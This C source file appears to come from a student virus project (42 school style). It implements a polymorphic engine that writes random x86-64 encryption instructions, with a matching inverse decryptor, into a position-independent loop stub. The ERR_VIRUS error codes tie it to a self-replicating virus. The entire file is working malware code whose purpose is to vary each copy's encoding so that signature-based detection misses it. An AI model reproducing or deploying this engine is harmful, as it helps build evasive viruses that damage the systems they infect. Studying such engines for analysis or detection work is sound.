/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   generate_cypher.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/11 20:54:46 by anselme           #+#    #+#             */
/*   Updated: 2020/01/16 23:03:31 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

# include <stdbool.h>
# include <stdint.h>
# include <stddef.h>

#include "accessors.h"
#include "utils.h"
#include "errors.h"
#include "position_independent.h"

/* ask your mom */
#define BIT32_OVERFLOW	(~(uint64_t)~(uint32_t)0)

#define CYPHER		0
#define DECYPHER	1

#define IB		1
#define IW		2
#define ID		4
#define IO		8

#define REX		(1 << 0)
#define OPP		(1 << 1)
#define OPC		(1 << 2)
#define MOD		(1 << 3)
#define SIB		(1 << 4)
#define DSP		(1 << 5)
#define IMM		(1 << 6)

enum
{
	I_BASE,
	XOR_RM64_IMM8,          /* REX.W + 83 /6 ib XOR r/m64, imm8 */
	ADD_RM64_IMM8,          /* REX.W + 83 /0 ib ADD r/m64, imm8 */
	SUB_RM64_IMM8,          /* REX.W + 83 /5 ib SUB r/m64, imm8 */

	XOR_RAX_IMM32,          /* REX.W + 35 id XOR RAX, imm32     */
	ADD_RAX_IMM32,          /* REX.W + 05 id ADD RAX, imm32     */
	SUB_RAX_IMM32,          /* REX.W + 2D id SUB RAX, imm32     */

	ROR_RM64_IMM8,          /* REX.W + C1 /1 ib                 */
	ROL_RM64_IMM8,          /* REX.W + C1 /0 ib                 */
	BSWAP_R64,              /* REX.W + 0F C8+rd, +0 for rax     */
	I_SIZE
};

struct x64_encode
{
	uint8_t		encode;
	uint8_t		size;
	uint8_t		rex;
	uint8_t		escape;
	uint8_t		opcode;
	uint8_t		modrm;
	uint8_t		sib;
	uint8_t		displacement;
	uint8_t		immediate;
};

static struct x64_encode	select_instruction(uint64_t *seed, int8_t operation)
{
	struct x64_encode	instructions[I_SIZE];
	instructions[XOR_RM64_IMM8] = (struct x64_encode){.encode=REX|OPC|MOD|IMM, .size=4, .rex=0x48, .escape=0   , .opcode=0x83, .modrm=0xf0, .sib=0, .displacement=0, .immediate=IB};
	instructions[ADD_RM64_IMM8] = (struct x64_encode){.encode=REX|OPC|MOD|IMM, .size=4, .rex=0x48, .escape=0   , .opcode=0x83, .modrm=0xc0, .sib=0, .displacement=0, .immediate=IB};
	instructions[SUB_RM64_IMM8] = (struct x64_encode){.encode=REX|OPC|MOD|IMM, .size=4, .rex=0x48, .escape=0   , .opcode=0x83, .modrm=0xe8, .sib=0, .displacement=0, .immediate=IB};
	instructions[XOR_RAX_IMM32] = (struct x64_encode){.encode=REX|OPC|IMM    , .size=6, .rex=0x48, .escape=0   , .opcode=0x35, .modrm=0   , .sib=0, .displacement=0, .immediate=ID};
	instructions[ADD_RAX_IMM32] = (struct x64_encode){.encode=REX|OPC|IMM    , .size=6, .rex=0x48, .escape=0   , .opcode=0x05, .modrm=0   , .sib=0, .displacement=0, .immediate=ID};
	instructions[SUB_RAX_IMM32] = (struct x64_encode){.encode=REX|OPC|IMM    , .size=6, .rex=0x48, .escape=0   , .opcode=0x2d, .modrm=0   , .sib=0, .displacement=0, .immediate=ID};
	instructions[ROR_RM64_IMM8] = (struct x64_encode){.encode=REX|OPC|MOD|IMM, .size=4, .rex=0x48, .escape=0   , .opcode=0xc1, .modrm=0xc8, .sib=0, .displacement=0, .immediate=IB};
	instructions[ROL_RM64_IMM8] = (struct x64_encode){.encode=REX|OPC|MOD|IMM, .size=4, .rex=0x48, .escape=0   , .opcode=0xc1, .modrm=0xc0, .sib=0, .displacement=0, .immediate=IB};
	instructions[BSWAP_R64]     = (struct x64_encode){.encode=REX|OPP|OPC    , .size=3, .rex=0x48, .escape=0x0f, .opcode=0xc8, .modrm=0   , .sib=0, .displacement=0, .immediate=0 };

	int			instructions_match[I_SIZE];
	instructions_match[XOR_RM64_IMM8] = XOR_RM64_IMM8;
	instructions_match[ADD_RM64_IMM8] = SUB_RM64_IMM8;
	instructions_match[SUB_RM64_IMM8] = ADD_RM64_IMM8;
	instructions_match[XOR_RAX_IMM32] = XOR_RAX_IMM32;
	instructions_match[ADD_RAX_IMM32] = SUB_RAX_IMM32;
	instructions_match[SUB_RAX_IMM32] = ADD_RAX_IMM32;
	instructions_match[ROR_RM64_IMM8] = ROL_RM64_IMM8;
	instructions_match[ROL_RM64_IMM8] = ROR_RM64_IMM8;
	instructions_match[BSWAP_R64]     = BSWAP_R64;

	uint64_t	instruction = random_exrange(seed, I_BASE, I_SIZE);

	if (operation == CYPHER)
		return instructions[instruction];
	else
		return instructions[instructions_match[instruction]];
}

static void	encode_instruction(uint8_t *buffer, struct x64_encode i, uint64_t *seed)
{
	uint64_t	displacement = 0; /* not implemented */
	uint64_t	immediate    = 0;
	uint8_t		operand_size = i.immediate;

	/* choose an immediate value from a 1, 2, 4 or 8 byte range according to the operand size of the instruction */
	if      (operand_size == IB) {immediate = random_inrange(seed, 0x1, 0x7f);}
	else if (operand_size == IW) {immediate = random_inrange(seed, 0x80, 0x7fff);}
	else if (operand_size == ID) {immediate = random_inrange(seed, 0x8000, 0x7fffffff);}
	else if (operand_size == IO) {immediate = random_inrange(seed, 0x800000000, 0x7fffffffffffffff);}

	if (i.encode & REX) {*buffer = i.rex;    buffer++;}
	if (i.encode & OPP) {*buffer = i.escape; buffer++;}
	if (i.encode & OPC) {*buffer = i.opcode; buffer++;}
	if (i.encode & MOD) {*buffer = i.modrm;  buffer++;}
	if (i.encode & SIB) {*buffer = i.sib;    buffer++;}

	if (i.encode & DSP) {memcpy(buffer, &displacement, operand_size); buffer += operand_size;}
	if (i.encode & IMM) {memcpy(buffer, &immediate, operand_size);    buffer += operand_size;}
}

static void	generate_shuffler(uint8_t *buffer, uint64_t seed, size_t size)
{
	struct x64_encode	i;

	bzero(buffer, size);

	while (size)
	{
		i = select_instruction(&seed, CYPHER);
		if (i.size > size)
		{
			memset(buffer, 0x90, size);
			break;
		}
		encode_instruction(buffer, i, &seed);
		buffer += i.size;
		size -= i.size;
	}
}

static void	generate_unshuffler(uint8_t *buffer, uint64_t seed, size_t size)
{
	struct x64_encode	i;

	bzero(buffer, size);
	buffer += size;

	while (size)
	{
		i = select_instruction(&seed, DECYPHER);
		if (i.size > size)
		{
			buffer -= size;
			memset(buffer, 0x90, size);
			break;
		}
		buffer -= i.size;
		encode_instruction(buffer, i, &seed);
		size -= i.size;
	}
}

/*
** generate_loop_frame:
**   - writes a header at the beginning of the buffer
**   - writes a footer at the end of the buffer
**   - returns a safe pointer to the middle of the buffer
**   - returns a NULL safe pointer in case size is too small
*/
static struct safe_ptr    generate_loop_frame(void *buffer, size_t size)
{
	PD_ARRAY(uint8_t, header,
		0x48, 0xc1, 0xee, 0x03,             /*     shr rsi, 0x3       */
		0x48, 0xc1, 0xe6, 0x03,             /*     shl rsi, 0x3       */
		0x48, 0x85, 0xf6,                   /* cypher: test rsi, rsi  */
		0x0f, 0x84, 0x13, 0x00, 0x00, 0x00, /*     jz cypher_end      */
		0x48, 0x8b, 0x07                    /*     mov rax, [rdi]     */
	);

	PD_ARRAY(uint8_t, footer,
		0x48, 0x89, 0x07,                   /*     mov [rdi], rax     */
		0x48, 0x83, 0xc7, 0x08,             /*     add rdi, 0x8       */
		0x48, 0x83, 0xee, 0x08,             /*     sub rsi, 0x8       */
		0xe9, 0xe4, 0xff, 0xff, 0xff,       /*     jmp cypher         */
		0xc3                                /* cypher_end: ret        */
	);

	if (size < sizeof(footer) + sizeof(header))
		return (struct safe_ptr){NULL, 0};

	void	*remaining_buffer = buffer + sizeof(header);
	size_t	remaining_size    = size - sizeof(footer) - sizeof(header);

	uint32_t	*rel_cypher_end = (uint32_t*)&header[13];
	uint32_t	*rel_cypher     = (uint32_t*)&footer[12];

	/* check for overflows and underflows */
	if ((*rel_cypher_end + remaining_size) & BIT32_OVERFLOW
	|| (*rel_cypher - remaining_size) > *rel_cypher)
		return (struct safe_ptr){NULL, 0};

	*rel_cypher_end += (uint32_t)remaining_size;
	*rel_cypher     -= (uint32_t)remaining_size;

	memcpy(buffer, header, sizeof(header));
	memcpy(buffer + size - sizeof(footer), footer, sizeof(footer));

	return (struct safe_ptr){remaining_buffer, remaining_size};
}

bool		generate_cypher(void *buffer, uint64_t seed, size_t size)
{
	struct safe_ptr	frame;

	frame = generate_loop_frame(buffer, size);
	if (frame.ptr == NULL) return errors(ERR_VIRUS, _ERR_GEN_LOOP_FRAME);

	generate_shuffler(frame.ptr, seed, frame.size);
	return true;
}

bool		generate_decypher(void *buffer, uint64_t seed, size_t size)
{
	struct safe_ptr	frame;

	frame = generate_loop_frame(buffer, size);
	if (frame.ptr == NULL) return errors(ERR_VIRUS, _ERR_GEN_LOOP_FRAME);

	generate_unshuffler(frame.ptr, seed, frame.size);
	return true;
}
